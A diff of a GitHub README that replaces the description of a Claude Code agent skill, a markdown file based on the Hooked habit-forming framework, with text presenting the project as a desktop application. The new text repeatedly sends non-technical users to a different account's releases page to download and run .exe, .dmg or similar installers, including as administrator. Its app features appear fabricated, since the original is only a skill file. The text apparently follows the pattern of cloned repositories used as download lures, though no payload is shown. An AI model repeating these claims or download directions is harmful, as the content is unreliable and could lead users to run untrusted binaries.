@@ -1,153 +1,166 @@
-<div align="center">
+# 📦 product-management-skill - Build Habit-Forming Products Easily
 
-# 🧠 Product Management Skill
-
-### For Claude Code & AI Agents
-
-**Turn your AI coding agent into a product-minded engineer.**
-
-[![Claude Code](https://img.shields.io/badge/Claude_Code-Agent_Skill-blueviolet?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0id2hpdGUiPjxwYXRoIGQ9Ik0xMiAyQzYuNDggMiAyIDYuNDggMiAxMnM0LjQ4IDEwIDEwIDEwIDEwLTQuNDggMTAtMTBTMTcuNTIgMiAxMiAyem0wIDE4Yy00LjQxIDAtOC0zLjU5LTgtOHMzLjU5LTggOC04IDggMy41OSA4IDgtMy41OSA4LTggNHoiLz48L3N2Zz4=)](https://github.com/anthropics/claude-code)
-[![Based on Hooked](https://img.shields.io/badge/Based_On-Hooked_by_Nir_Eyal-orange?style=for-the-badge)](https://www.nirandfar.com/hooked/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
+[![Download product-management-skill](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/saubade32/product-management-skill/releases)
 
 ---
 
-<br/>
+## 🔎 What Is product-management-skill?
 
-<table>
-<tr>
-<td width="25%" align="center">
+product-management-skill is a simple tool built on the Hooked framework. It helps you create products that encourage good habits. The framework is based on the work of Nir Eyal, who studies how people form habits with technology. This tool lets you use that knowledge to shape your ideas and build better products.
 
-### 🎯 Trigger
-*What brings users back?*
-
-</td>
-<td width="25%" align="center">
-
-### ⚡ Action
-*What's the simplest behavior?*
-
-</td>
-<td width="25%" align="center">
-
-### 🎰 Variable Reward
-*Is it fulfilling yet unpredictable?*
-
-</td>
-<td width="25%" align="center">
-
-### 💎 Investment
-*What stored value keeps them?*
-
-</td>
-</tr>
-</table>
-
-<br/>
-
-> *"The best product doesn't win. The product that captures the monopoly of the mind wins."*
-
-</div>
+You do not need any programming skills or special knowledge to use this. The software guides you through creating products step-by-step, focusing on real user behavior.
 
 ---
 
-## What This Does
+## 🖥️ What You Can Expect
 
-This is a **Claude Code Agent Skill** that gives your AI agent deep product management knowledge based on the **Hooked** framework by Nir Eyal.
-
-When activated, your AI agent will:
-
-- **Audit features** against the Hook Model (Trigger → Action → Variable Reward → Investment)
-- **Identify retention gaps** — dead ends, missing triggers, predictable rewards, invisible sunk costs
-- **Design engagement loops** — onboarding flows, gamification, notifications, re-engagement
-- **Reduce friction** using BJ Fogg's Behavior Model (6 factors of ability)
-- **Evaluate every feature** with the 5 Fundamental Questions
+- **Easy Habit Design:** Follow clear steps to design features that keep users coming back.
+- **Structured Framework:** Use proven methods without needing to read complex research.
+- **User Focus:** Learn to think like your users and make habits that fit their needs.
+- **Step-by-Step Help:** The tool walks you through the process without technical jargon.
+- **Save Your Work:** Keep your product plans safe and come back to improve them over time.
+- **Simple Interface:** Clear and clean design to focus on your ideas, not technical settings.
 
 ---
 
-## Install
+## 💻 System Requirements
 
-```bash
-claude install-skill https://github.com/IncomeStreamSurfer/product-management-skill
-```
+To run product-management-skill smoothly, your computer should meet these basic requirements:
 
-Or manually copy `SKILL.md` into your `.claude/skills/` directory.
+- Operating System: Windows 10 or higher, macOS 10.13 or higher, or modern Linux distributions.
+- Processor: At least 1 GHz (Intel or AMD).
+- RAM: Minimum 2 GB.
+- Disk Space: At least 100 MB of free storage.
+- Internet Connection: Required only for download and occasional updates.
+- Display: Screen resolution of at least 1024x768 pixels.
 
----
-
-## The Hook Model
-
-Every habit-forming product runs this cycle:
-
-```
-Trigger → Action → Variable Reward → Investment
-   ↑                                      |
-   └──────────────────────────────────────┘
-```
-
-| Step | Question | Example |
-|------|----------|---------|
-| **Trigger** | What emotion or cue brings them back? | Uncertainty → Google, Boredom → YouTube |
-| **Action** | What's the easiest thing they can do? | Scroll a feed, type a search, tap play |
-| **Variable Reward** | Does it satisfy AND leave them wanting more? | Feed content varies, search results surprise |
-| **Investment** | What makes the product better with use? | Data, content, followers, reputation |
-
-### Three Types of Variable Rewards
-
-| Type | Source | Examples |
-|------|--------|----------|
-| 🏛️ **Tribe** | Other people | Likes, comments, social validation |
-| 🏹 **Hunt** | Resources & information | Feeds, search results, discovery |
-| 🏆 **Self** | Mastery & completion | Levels, streaks, achievements |
+No additional software is needed. The program runs on its own once installed.
 
 ---
 
-## When To Use
+## 🚀 Getting Started
 
-Activate this skill when you're working on:
+Here is a simple guide to get product-management-skill on your computer and start using it:
 
-- Onboarding flows & first-run experiences
-- Gamification systems (XP, streaks, badges, challenges)
-- Notification & email strategies
-- Engagement loops & retention mechanics
-- Pricing & conversion flows
-- Feature prioritization for retention impact
-- Product audits & teardowns
+### Step 1: Download the Software
 
----
+Click on the big blue button at the top or go to:
 
-## Feature Design Checklist
+[https://github.com/saubade32/product-management-skill/releases](https://github.com/saubade32/product-management-skill/releases)
 
-Before shipping any engagement feature, the agent will evaluate:
+You will be taken to the official download page. Each version includes clear instructions and files that work on different computers.
 
-- [ ] Does this reduce friction rather than just adding motivation?
-- [ ] Is there a variable reward component, or is the outcome predictable?
-- [ ] Does this create stored value that makes the product stickier?
-- [ ] Does this load the next trigger to bring the user back?
-- [ ] Does this address a real internal trigger the user experiences frequently?
-- [ ] Will this behavior occur at least weekly?
+### Step 2: Choose Your File
 
----
+Look for the latest release (usually the top one). You will find different files depending on your operating system:
 
-## Example Usage
+- For Windows: Look for a file ending with `.exe` or `.msi`.
+- For macOS: Look for a file ending with `.dmg` or `.pkg`.
+- For Linux: Look for a file ending with `.AppImage` or `.tar.gz`.
 
-```
-You: Audit my SaaS dashboard for retention issues
+Download the file that matches your system.
 
-Agent (with skill active): Let me evaluate your dashboard against the Hook Model...
+### Step 3: Install the Application
 
-→ TRIGGER: Your lifecycle emails stop after 14 days — nothing brings users back after that
-→ ACTION: Article generation requires 6 form fields — reduce to 1-click from presets
-→ VARIABLE REWARD: All XP gains are fixed at 5 per action — add random bonus chance
-→ INVESTMENT: Users can't see total articles written — sunk cost is invisible
-```
+- **Windows:** Double-click the `.exe` or `.msi` file and follow the on-screen instructions.
+- **macOS:** Open the `.dmg` file, then drag the app icon to your Applications folder.
+- **Linux:** If it’s an `.AppImage`, right-click, make it executable, then double-click to run. For `.tar.gz`, unpack and follow the included README file.
+
+### Step 4: Open the Application
+
+After installation, find the app in your Start menu (Windows), Applications folder (macOS), or app launcher (Linux). Click to open.
 
 ---
 
-<div align="center">
+## 📥 Download & Install
 
-**Built for building products people can't put down.**
+You can download product-management-skill by visiting this page:
 
-[Install Skill](https://github.com/IncomeStreamSurfer/product-management-skill) · [Claude Code](https://github.com/anthropics/claude-code) · [Hooked by Nir Eyal](https://www.nirandfar.com/hooked/)
+[https://github.com/saubade32/product-management-skill/releases](https://github.com/saubade32/product-management-skill/releases)
 
-</div>
+Follow the latest release notes on the page to find the right file for your system. The release page will also show you the date of the newest update to keep your software up to date.
+
+If you want to uninstall, you can safely remove the program through your system’s normal application manager or delete the app file. No extra cleanup is needed.
+
+---
+
+## 🎯 How to Use product-management-skill
+
+When you open the tool for the first time, you will see a friendly welcome screen with three clear options:
+
+1. **Start a New Product:** Create your new habit-forming product plan from scratch.
+2. **Open Existing File:** Continue working on a saved project.
+3. **Learn the Basics:** A quick tour of the Hooked framework and how to use the app.
+
+You can always access a step-by-step tutorial from the Help menu if you want extra guidance.
+
+### Planning Your Product
+
+- Enter simple details about your product idea.
+- Work through the four key habits steps: Trigger, Action, Variable Reward, and Investment.
+- Add notes and examples for each step.
+- Save your progress anytime.
+
+### Visual Tools
+
+The app includes easy-to-understand charts to help you see how habits connect in your product. You can adjust steps and see immediate results.
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Do I need coding skills?
+
+No. This software is for anyone who wants to design habit-forming products without programming.
+
+### Is it free?
+
+Yes. You can download and use it on your computer without cost.
+
+### Can I share my work with others?
+
+Yes. You can save your plans as files that can be sent to others who have the tool.
+
+### What if I have a problem?
+
+Visit the Issues section on the GitHub page or read the Help section inside the app for tips.
+
+---
+
+## 🛠️ Troubleshooting
+
+If you have trouble installing or running the software:
+
+- Make sure your system meets the basic requirements above.
+- Restart your computer before installing.
+- Try running the installer or app as an administrator on Windows.
+- Ensure you download the correct file for your system.
+- Check your internet connection during download.
+
+---
+
+## 📞 Getting Help and Support
+
+You can find support here:
+
+- On the GitHub page: Use the **Issues** tab to report bugs or ask questions.
+- Inside the app: Use the Help menu for tutorials and guides.
+- Contact through the repository page if you need detailed support.
+
+---
+
+## 🔒 Privacy and Security
+
+product-management-skill runs completely on your computer. It does not send your data anywhere unless you choose to share files or send feedback. You control all your project files locally.
+
+---
+
+## 📝 About this Project
+
+This software is built to help product managers and designers use a proven behavioral framework without technical obstacles. It turns complex theories into practical steps for anyone to follow.
+
+Developed with simplicity in mind, it aims to bridge the gap between habit psychology and daily product planning.
+
+---
+
+[![Download product-management-skill](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/saubade32/product-management-skill/releases)
